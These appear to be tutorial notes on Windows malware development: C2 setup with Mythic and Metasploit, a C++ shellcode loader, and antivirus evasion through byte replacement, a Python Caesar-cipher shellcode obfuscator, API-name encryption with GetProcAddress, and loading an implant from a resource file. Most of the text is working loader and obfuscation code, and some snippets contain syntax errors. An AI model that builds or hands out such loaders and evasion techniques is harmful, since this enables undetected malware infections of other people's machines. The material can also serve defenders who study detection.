# Windows Malware Development

This course aims to outline the basics of Malware Development for Windows.
C2 frameworks are covered as well as writing shellcode in Cpp.

## C2 Review

There are two major categories of C2: Synchronous and Asynchronous.

SynC2 are continuous connections. Metasploit is a SynC2, and so is SSH.
AsynC2s are the more common ones that use sleep timers. This makes it
easier to hide traffic and forces the target to rely on behavioral detections.

Using `run -j` sets a given task to run automatically as a job in Metasploit.

### Mythic C2

C2 where the community writes agents in any language. Used in the course.

* C2: `https://github.com/its-a-feature/Mythic`
* Agents: `https://github.com/MythicAgents/Athena`

Starting mythic is as simple as `./mythic-cli start`. You log in at
`https://127.0.0.1:8443` and the default password is generated and put
in the `.env` file within the mythic folder.

According to their [github.io](https://mythicmeta.github.io/overview/) it looks
like only a couple agents are still being worked on reliably.

## Building Shellcode Loaders

It's important to know that regular programs and malware operate the same way.
They both need three things:

1. A place to put their code
2. A way to execute their code
3. A way to keep executing their code

There are many ways to do this on windows, which is why the Win32 API documenation
is incredibly useful. You can read it [here](https://docs.microsoft.com/en-us/windows/win32/api).
An important section to notice is the (memory protection constants)
[https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants].
Due to the vastness of this documentation, there will almost always be another way to accomplish
these 3 objectives aside from the basic pathway covered in this course.

### A Place

A place to put shellcode can be accomplished by using `VirualAlloc`, a memory allocation function
in the Win32 API. This is an allocation function that will give us the memory we need. The schema
is below:

```c++
LPVOID VirtualAlloc(
    [in, optional]  LPVOID lpAddress,
    [in]            SIZE_T dwSize,
    [in]            DWORD flAllocationType,
    [in]            DWORD flProtect
);
```

As we can see, the function needs 4 things, given from top to bottom:

1. A Pointer Address for the memory
2. The size of the data that we need to add to memory
3. An allocation type (committing, reserving)
4. What memory protections we want (if any)

The following is an example of what this would look like:

`VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, 0x40);`

Where `0` is the first available area, `payload_len` is a var equal to the size of the code,
`MEM_COMMIT | MEM_RESERVE` is the instruction to both reserve and commit the memory, and
`0x40` is the dword that sets the `rwx` permissions to the buffer.

#### Moving to the Buffer

This is a subrequisite of reserving a space in the buffer. You have to be able to move the shellcode
to the space you've just reserved. This can be done with `RtlMoveMemory`:

```c++
VOID RtlMoveMemory(
    _Out_   VOID UNALIGNED *Destination,
    _In_    VOID UNALIGNED *Source,
    _In_    SIZE_T          Length
);
```

The elements are the destination, the shellcode (Source) and the length to copy. This does mean
that you can copy over only partial bits of the shellcode if you want to try to obfuscate it some way.

The following is an example of what this would look like:

`RtlMoveMemory(allocated_mem, payload, payload_length)`

Where `allocated_mem` is the pointer address of our `VirtualAlloc` chunk, `payload` is the unsigned character
array of our payload (msfvenom output) and `length` is an int.

### Executing

Exeuction can be handled with `CreateThread`, which will do exactly that:

`CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload, 0, 0, 0);`

Where the first 0 is security attributes, the second 0 sets the defualt stack size,
the third argument is the thread start routine we want to use, and the last three
options control tying another thread in, start time delay and thread identification.

### Keeping it Alive

There are a lot of ways to do this. We will use `WaitForSingleObject` here.

```c++
DWORD WaitForSingleObject(
    [in] HANDLE hHandle,
    [in] DWORD  dwMilliseconds
);
```

Where `hHandle` is the handle to watch and `dwMilliseconds` is the time limit before the process
is killed. This can be set to infinity, however. We can do this in a number of ways, but
`WaitForSingleObject(thread, -1);` is easy enough.

## First Malware

This section is separate simply for ease of access. Following this paragraph will be a simple shellcode
loader and a description of what it does:

```c++
#include <iostream>
#include <Windows.h>

int main()
{
    void* execute; //instantiate void pointer for execute (initialize empty variable)
    HANDLE thread; //instantiate handle with name thread
    unsigned char buf[] =
        "Shellcode";    // Drop shellcode into script.
        // It's important to note that most AV will capture a loader if the shellcode is 
        // right at the top because that's how a lot of malware tutorials handle the 
        // positioning of shellcode.
    unsigned int buf_len = sizeof(buf); // Gather shellcode size for use later
    execute = VirtualAlloc(0, buf_len, MEM_COMMIT | MEM_RESERVE, 0x40); // 0x40 isn't the best DWORD for this
                                                                        // More restrictive is stealthier
    RtlMoveMemory(execute, buf, buf_len) // Bring shellcode to the buffer
    thread =  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0); // execute
    WaitForSingleObject(thread, -1); // Hodor.
}
```

## Basic Obfuscation

AV faces a number of limitations in the form of UX and network load. By unpacking and sandboxing everything
that runs on any given machine, end user activity is slowed down. Because of this, AV uses heuristic
analysis to speed up the scanning and quarantining process. These could include, but are not limited to:

* Checking character buffers for known malicious strings
* Using an `objdump` or `procmon`-like utility to check function calls without executing the file
* Quickly sandboxing the executable to check for outbound connections

Basic AV is typically limited to these heuristics only. Enterprise AV/EDR has ML involved that
requires another course, so this will only cover entry/consumer AV.

_msfvenom prints 4 magic bytes at the start of every payload it generates_. These bytes are
`fc4883e4` and they are a smoking gun for AV detections, especially when you also have an IP
address in the shellcode as well.

There are a few basic things we can do to bypass these detections, though. They are simple:

* Convert strings to hex (will only defeat very basic AV and AMSI)
* String/Character replacements
* Concatenation
* Basic encoding/encryption

Let's examine each of these one by one:

### Character Replacement

Typically, static analysis will capture and alert on strings of characters,
like the Metasploit magic bytes `fc4883e4`. You can simply store the magic
bytes elsewhere in another variable and insert 4 junk bytes into the start
of the payload buffer. When we execute, the 4 magic bytes needed to run
the payload will replace the 4 junk bytes at the start of the buffer
using something like `memcpy` or `RtlMoveMemory`:

```c++
void RtlMoveMemory(
    void*       Destination,
    const void* Source,
    size_t      Length
);

unsigned char buf[] = "shellcode";
char replace[] = "/xfc/x48/x83/xe4";

memcpy(buf,replace,4);
```

In the above example, our magic bytes are in `replace` but the
buffer is clean. Static analysis tools will not generally alert
on this because they generally search for patterns in contiguous
memory, but do not have the resources to track how different bytes
might be combined at runtime.

### Basic Encryption

Using something like ROT47 or a Caesar Cipher is a much
easier way to eliminate malicious strings from your code.
Using modulo math, you can manipulate bytes in Base 16 without
having your values go over 255. We'll look into this in the next
section where we build an obfuscator in Python.

### Python Obfuscator

Here we go...

```Python
import sys

offset = 0 # woo, woo, woo, woo, woo! rackaids on rackaids...

# Very step-by-step Caesar Cipher function.
def cc(shellfile):
    counter = 1
    byte = ''
    encoded_shellcode = ''
    # The following variables strip characters step-by-step so it's 
    # easier to see what is being removed.
    strep = shellfile.replace("unsigned char buf[] = ", "") # leaves only bytes
    nlstrip = strep.replace("\n", "") 
    semistrip = nlstrip.replace(";", "")
    quotestrip = semistrip.replace('"', "")
    slashstrip = quotestrip.replace("\\", "")
    shell_hex = slashstrip.replace("x", "")

    # Iterate through code and encrypt
    for i in shell_hex:
        if(counter % 2 == 0):
            byte = byte + i
            byte = int(byte, 16)
            byte = int(byte + offset)
            byte = int(byte % 256) # 255 in C, C++
            byte = hex(byte)[2:] # Revert to Hex, strip '0x'
            if(len(byte) == 1):
                byte = '0' + byte # append 0 to single digit hex vals
            byte = "\\" + byte # reappend backslash
            encoded_shellcode = encoded_shellcode + byte
            byte = ''
        else:
            byte = byte + i
        counter += 1
    encoded_shellcode = encoded_shellcode
    return encoded_shellcode

# reinsert newlines and unsigned char declaration
# after encryption
def format_text(string, every=60)
    lines = []
    lines.append("unsigned char notbuf[] = ") # 'buf' alerts AV, so change it
    for i in range(0, len(string), every):
        lines.append("\"" + string[i:i+every] + "\"")
    return '\n'.join(lines)


def main():
    try:
        shellfile = open(sys.argv[1], "r").read()
    except:
        print("Input File Required. Usage: %s <filename>" %sys.argv[0])
        sys.exit()
    
    enc_text = cc(shellfile)
    print(format_text(enc_text))

main()
```

Now that we have this working encryption script, we can take the
output and paste it into our basic malware cpp file created previously.
After swapping out all instances of `buf` to our new, stealhy `notbuf`,
we have to implement decryption inside the script by adding the following
lines after our `execute` var and before we call `RtlMoveMemory`:

```c++
int offset = 322; // or whatever your offset is
int i = 0; // for byte counting
do {
    notbuf[i] = (int(notbuf[i]) - offset % 255);
    i++;
} while (i < (sizeof(notbuf) - 1 ));
```

### Function Obfuscation

The malicious code is hidden via encryption, but the functions are not.
This means that utilities like `objdump` are still going to flag the
script because they know we are using a likely malicious combination
of function calls.

We can hide the functions by naming them something else or calling them
via a global function. Let's look at `VirtualAlloc` for example. We can
abstract the functionality of `VirtualAlloc` using the following C++:

```c++
typedef LPVOID(WINAPI* VA)(
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flNewProtect,
    DWORD   flProtect
);
```

We can then call this using `GetProcAddress` and `GetModuleHandleA` to help
the program understand that we are trying to call `VirtualAlloc` in an
abstracted fashion. `GetProcAddress` gets a function name from a DLL or
variable while `GetModuleHandleA` retrieves the Handle for a specific
module or DLL. It would look like this:

```c++
// Initialize a function to get VirtualAlloc from kernel32
VA vainit = (VA) GetProcAddress(GetModuleHandleA(kernel32), VirtualAlloc);

// call VirtualAlloc via a different function name
vainit(0, payload_length, MEM_COMMIT | MEM_RESERVE, 0x40);
```

This will remove `VirtualAlloc` from the import table, but will
now make it detectable in `strings`. To bypass this, we can convert
the function name to hex and encode it with a basic cipher. This
is all the obfuscation we would need to avoid basic static analysis.
Let's try it:

```Python
import sys

offset = 0

def cc(input):
    counter = 0
    byte = ''
    encoded_shellcode = ''
    try:
        shell_hex = input.replace("unsigned char buf[] = ", "").translate(str.maketrans("", "", '"\n;\\x'))
    except:
        shell_hex = input # Leave it alone if it's right.
    
    for i in shell_hex:
        if(counter % 2 == 0):
            byte = byte + i
            byte = int(byte, 16)
            byte = int(byte + offset)
            byte = int(byte % 256) # 255 in C, C++
            byte = hex(byte)[2:] # Revert to Hex, strip '0x'
            if(len(byte) == 1):
                byte = '0' + byte # append 0 to single digit hex vals
            byte = "\\" + byte # reappend backslash
            encoded_shellcode = encoded_shellcode + byte
            byte = ''
        else:
            byte = byte + i
        counter += 1
    encoded_shellcode = encoded_shellcode
    return encoded_shellcode

def format_text(string, every=60)
    lines = []
    lines.append("unsigned char notbuf[] = ") # 'buf' alerts AV, so change it
    for i in range(0, len(string), every):
        lines.append("\"" + string[i:i+every] + "\"")
    return '\n'.join(lines)

def string2hex(string):
    plaintext = string.encode('utf-8')
    hexstring = plaintext.hex()
    return hexstring

def main():
    strval = sys.argv[1]
    shell = string2hex(strval)
    enc_txt = cc(shell)
    print(format_text(enc_txt))

main()
```

This code is pretty much identical to the other caesar cipher
script we made except you give it a string instead of a filename.

We can now append the following into our malware's main function:

```c++
char va[] = "encoded hex"; // VirtualAlloc Encrypted
char ct[] = "encoded hex"; // CreateThread Encrypted
char mvm[] = "encoded hex"; // RtlMoveMem Encrypted
char kl32[] = "encoded hex"; // kernel32 Encrypted
```

These are variables for the encrypted function names we are using in our
malware. Each of these needs a typedef function to be written outside of
our main function:

```c++
typedef LPVOID(WINAPI* VA)(
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flNewProtect,
    DWORD   flProtect
);

typedef VOID(WINAPI* MVM)(
    VOID UNALIGNED*         Destination,
    const VOID UNALIGNED*   Source,
    SIZE_T                  Length,
);

typedef HANDLE(WINAPI* CT)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    _drv_aliasesMem LPVOID  lpParameters,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

void Caesar(char* data, size_t data_len, int offset){
    int i = 0;
    do {
        data[i] = (int(data[i]) - offset % 255);
        i++;
    } while (i < data_len);
}
```

Now that we have our Caesar cipher and our typedefs, each
encrypted function name must be iteratively decrypted and called
to run the malware:

```c++
char kl32[] = "encoded hex";
Caesar((char*)kl32, strlen(kl32), 322);
char va[] = "encoded hex";
Caesar((char*)va, strlen(va), 322);
VA vainit = (VA) GetProcAddress(GetModuleHandleA(kl32), va);
execute = vainit(0, notbuf_len, MEM_COMMIT | MEM_RESERVE, 0x40);
// etc. etc. for all functions
```

Using this coding style, we can decrypt things as we need them
and use them in time:

```c++
Caesar((char*)notbuf, notbuf_len, 322);
char mvm[] = "encoded hex";
Caesar((char*)mvm, strlen(mvm), 322);
MVM mvminit = (MVM) GetProcAddress(GetModuleHandleA(kl32), mvm);
mvminit(execute, notbuf, notbuf_len);
```

## Using Resource Files

Using headers or imports can help obfuscate malware and help the
shellcode loaders stay smaller. C data types also have size limits,
so if you're trying to use a character array of size greater than
65,535 you might run into a problem. Creating a resource file requires
three things:

1. A Header File
2. A Resource script
3. Resources outlined in that script

VS IDE makes it really easy to generate resource files. You just have to
declare the type of resource. Once we have developed it, there are 3 things
we need:

1. A way to find the resource
2. A way to load the resource
3. A way to call the place it's stored

Which we can do with the following functions:

### FindResourceA

We can use this method to find the resource we want to load:

```c++
HRSRC FindResourceA(
    [in, optional]  HMODULE hModule,
    [in]            LPCSTR  lpName,
    [in]            LPCSTR  lpType
);
```

`hModule` is almost always `NULL` because we want the program to
search within the current process. `lpName` can be either a pointer
or a `MAKEINTRESOURCE<ID>` generated when our resource is created.
The final option `lpType` is pretty much always going to be `RT_RCDATA`
because we aren't going to be loading images or stuff like that into
our malware (this isn't a cracker). Here is an example of the function:

`FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);`

Where `IDR_RCDATA1` is our resource ID.

### LoadResource

```c++
HGLOBAL LoadResource(
    [in, optional]  HMODULE hModule,
    [in]            HRSRC   hResInfo
);
```

Again, `HMODULE` is going to be `NULL` and the `hResInfo` variable is
going to be the variable output from our `FindResource` call:

`LoadResource(NULL, resource);`

### LockResource

```c++
LPVOID LockResource(
    [in]    HGLOBAL hResData
);
```

This will let you call the resource you've loaded. The `hResData`
variable is just the handle from `LoadResource`. It looks like
 `LockResource(resource);`

### Resource Errata

Because the information is initialized much earlier than it was
previously in the original script, we can't use `sizeof` or `strlen`
to get the size of our shellcode anymore. Instead, we have to use
`SizeofResource`, which looks like `SizeofResource(NULL, resource);`
where `resource` is the FindResource handle.

### Malware with Headers

When you cook up a payload in Mythic GUI, there is a section where
you can pick the commands your C2 implant is going to be able to
handle. You want the minimum amount of commands required to run.
If you need more later you can load them later since you will have
a connection to the implant. `load` and `exit` are a good starting
point. `run` and `shell` are added in the tutorial as another two
solid choices.

When you finalize the payload generation through Mythic,
_put an extension at the end of your filename_. If you don't do this
and you do include an extesion in your obfuscation you're going to fuck
up your payload.

When it comes time to import the payload as a resource file, use `RCDATA`
as the import type. After the resource file as been imported, you include
it with quotes instad of gators like: `#include "resource.h"`. Now our
main function will look more like this:

```c++
void* execute;
HANDLE thread;
HRSRC resource;
HGLOBAL resourceHandle = NULL;
unsigned char* notbuf;
unsigned int notbut_len;

// load resource
resource = FindResource(NULL, MAKTEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
// you will need to look at the resource file to get the id.
// it will be included next to "define"
resourceHandle = LoadResource(NULL, resource);
notbuf = (unsigned char*)LockResource(resourceHandle);
notbuf_len = SizeofResource(NULL, resource);
```

The rest of the script should remain unchanged, and should build without
issue. However, the detection should increase for this payload because
our entire shellcode/implant is completely unobfuscated. To fix this,
we need to obfuscate the resource file.

## Obfuscating Resource Files

The golden rule of obfuscation is that you need to maintain
the integrity of the data. bins stay as bins, images stay as images.
Also, because the data is "locked", we can't de-obfuscate until
after the data is moved from the resource into a buffer. C++ can
do this quite easily with pointers, fortunately.

When you work with binary data in Python3 there's too much fucking
error checking for you to work with it without binascii so be ready
to use that library.
